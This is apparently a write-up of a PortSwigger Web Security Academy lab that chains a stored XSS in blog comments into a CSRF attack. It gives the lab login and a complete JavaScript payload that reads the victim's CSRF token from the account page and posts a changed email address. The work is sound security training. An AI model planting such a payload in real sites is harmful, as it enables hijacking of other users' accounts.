
This lab contains a [stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) vulnerability in the blog comments function. To solve the lab, exploit the vulnerability to perform a [CSRF attack](https://portswigger.net/web-security/csrf) and change the email address of someone who views the blog post comments.

You can log in to your own account using the following credentials: `wiener:peter`

# Exploitation

The injection point is known (comment body), inject the following payload:

```html
<script>
function change_mail(token) {

var url = "https://0a4100e90328735b8085852800c300a7.web-security-academy.net/my-account/change-email";

var params = "email=testexploit%40test.com&csrf=" + token;

var CSRF = new XMLHttpRequest();

CSRF.open("POST", url, false);

CSRF.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

CSRF.send(params);

}

  

function get_token() {

var XHR = new XMLHttpRequest();

XHR.onreadystatechange = function () {

if (XHR.readyState == 4) {

var htmlSource = XHR.responseText; //page source

parser = new DOMParser().parseFromString(htmlSource, "text/html");

token = parser.getElementsByName("csrf")[0].value;

console.log(token)

change_mail(token);

}

}

XHR.open('GET', 'https://0a4100e90328735b8085852800c300a7.web-security-academy.net/my-account', true);

XHR.send();

}

  

function run_csrf() {

get_token();

}

  

run_csrf();
</script>
```

Reload and the lab is solved!

HAVE IN MIND THE LAB HINT!